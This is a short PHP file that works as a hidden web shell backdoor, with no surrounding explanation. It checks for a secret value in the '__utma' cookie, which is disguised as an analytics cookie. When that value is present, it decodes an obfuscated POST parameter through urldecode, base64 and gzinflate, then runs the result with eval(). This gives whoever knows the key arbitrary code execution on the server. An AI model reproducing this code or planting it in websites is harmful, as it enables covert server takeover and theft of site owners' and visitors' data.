<?php
if(!empty($_COOKIE['__utma']) and substr($_COOKIE['__utma'],0,16)=='3469825000034634'){
if (!empty($_POST['msg']) and $msg=@gzinflate(@base64_decode(@str_replace(' ','',urldecode($_POST['msg']))))){
  echo '<textarea id=areatext>';
  eval($msg);
  echo '</textarea>bg';
  exit;
}}
?>